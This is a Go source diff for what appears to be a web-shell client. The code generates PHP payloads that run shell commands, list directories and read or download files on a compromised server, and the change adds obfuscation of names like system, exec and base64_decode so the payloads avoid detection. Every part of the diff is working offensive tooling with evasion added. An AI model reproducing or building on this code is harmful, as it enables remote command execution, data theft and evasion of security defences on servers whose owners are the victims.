@@ -88,10 +88,20 @@ func (t *PHPTemplates) Exec() (string, map[string]string) {
 	v := [3]string{randomVar6(), randomVar6(), randomVar6()}
 	seps := NewSeparators()
 
+	// func name obfuscation
+	b64S, b64R := obfuscatedFunc("base64_decode")
+	sysS, sysR := obfuscatedFunc("system")
+	psS, psR := obfuscatedFunc("passthru")
+	seS, seR := obfuscatedFunc("shell_exec")
+	exS, exR := obfuscatedFunc("exec")
+	poS, poR := obfuscatedFunc("popen")
+	prS, prR := obfuscatedFunc("proc_open")
+
 	code := "" +
-		"$p=base64_decode(substr($_POST['" + v[0] + "'],0));" +
-		"$s=base64_decode(substr($_POST['" + v[1] + "'],0));" +
-		"$envstr=@base64_decode(substr($_POST['" + v[2] + "'],0));" +
+		b64S + ";" + sysS + ";" + psS + ";" + seS + ";" + exS + ";" + poS + ";" + prS + ";" +
+		"$p=" + b64R + "(substr($_POST['" + v[0] + "'],0));" +
+		"$s=" + b64R + "(substr($_POST['" + v[1] + "'],0));" +
+		"$envstr=@" + b64R + "(substr($_POST['" + v[2] + "'],0));" +
 		"$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
 		"$c=(substr($d,0,1)=='/')?'-c ' . '\"' . $s . '\"' : '/c ' . '\"' . $s . '\"';" +
 		"if(substr($d,0,1)=='/'){" +
@@ -104,13 +114,13 @@ func (t *PHPTemplates) Exec() (string, map[string]string) {
 		"function fe($f){$d=explode(',',@ini_get('disable_functions'));" +
 		"if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}" +
 		"return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));}" +
-		"function runcmd($c){$ret=0;$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
-		"if(fe('system')){@system($c,$ret);}" +
-		"elseif(fe('passthru')){@passthru($c,$ret);}" +
-		"elseif(fe('shell_exec')){print(@shell_exec($c));}" +
-		"elseif(fe('exec')){@exec($c,$o,$ret);print(join(\"\\n\",$o));}" +
-		"elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}" +
-		"elseif(fe('proc_open')){$p=@proc_open($c,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}$ret=0;@fclose($io[1]);@fclose($io[2]);@proc_close($p);}" +
+		"function runcmd($c){global " + sysR + "," + psR + "," + seR + "," + exR + "," + poR + "," + prR + ";$ret=0;$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
+		"if(fe(" + sysR + ")){@" + sysR + "($c,$ret);}" +
+		"elseif(fe(" + psR + ")){@" + psR + "($c,$ret);}" +
+		"elseif(fe(" + seR + ")){print(@" + seR + "($c));}" +
+		"elseif(fe(" + exR + ")){@" + exR + "($c,$o,$ret);print(join(\"\\n\",$o));}" +
+		"elseif(fe(" + poR + ")){$fp=@" + poR + "($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}" +
+		"elseif(fe(" + prR + ")){$p=@" + prR + "($c,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}$ret=0;@fclose($io[1]);@fclose($io[2]);@proc_close($p);}" +
 		"else{$ret=127;}" +
 		"return $ret;}" +
 		"$ret=@runcmd($r . ' 2>&1');" +
@@ -129,7 +139,8 @@ func (t *PHPTemplates) Exec() (string, map[string]string) {
 func (t *PHPTemplates) FileList() (string, map[string]string) {
 	v := randomVar6()
 	errPrefix := "ERR:" + randomHex(8) + ":"
-	code := "$D=base64_decode(substr($_POST[\"" + v + "\"],0));"
+	b64S, b64R := obfuscatedFunc("base64_decode")
+	code := b64S + ";" + "$D=" + b64R + "(substr($_POST[\"" + v + "\"],0));"
 	code += "if(substr($D,-1)!=\"/\"){$D.=\"/\";}"
 	code += "$F=@opendir($D);if($F===false){echo(\"" + errPrefix + "PATH_UNAVAILABLE\");"
 	code += "}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date(\"Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}"
@@ -140,7 +151,8 @@ func (t *PHPTemplates) FileList() (string, map[string]string) {
 func (t *PHPTemplates) FileRead() (string, map[string]string) {
 	v := randomVar6()
 	errPrefix := "ERR:" + randomHex(8) + ":"
-	code := "$F=base64_decode(substr($_POST[\"" + v + "\"],0));"
+	b64S, b64R := obfuscatedFunc("base64_decode")
+	code := b64S + ";" + "$F=" + b64R + "(substr($_POST[\"" + v + "\"],0));"
 	code += "$P=@fopen($F,\"rb\");if($P===false){echo(\"" + errPrefix + "FILE_OPEN_FAILED\");}else{$C=@stream_get_contents($P);@fclose($P);if($C===false){echo(\"" + errPrefix + "FILE_READ_FAILED\");}else{echo $C;}}"
 	return code, map[string]string{v: placeholderBase64Path}
 }
@@ -149,7 +161,8 @@ func (t *PHPTemplates) FileRead() (string, map[string]string) {
 func (t *PHPTemplates) FileDownload() (string, map[string]string) {
 	v := randomVar6()
 	errPrefix := "ERR:" + randomHex(8) + ":"
-	code := "$F=base64_decode(substr($_POST[\"" + v + "\"],0));"
+	b64S, b64R := obfuscatedFunc("base64_decode")
+	code := b64S + ";" + "$F=" + b64R + "(substr($_POST[\"" + v + "\"],0));"
 	code += "$P=@fopen($F,\"rb\");if($P===false){echo(\"" + errPrefix + "FILE_OPEN_FAILED\");}else{@fclose($P);$N=@readfile($F);if($N===false){echo(\"" + errPrefix + "FILE_READ_FAILED\");}}"
 	return code, map[string]string{v: placeholderBase64Path}
 }
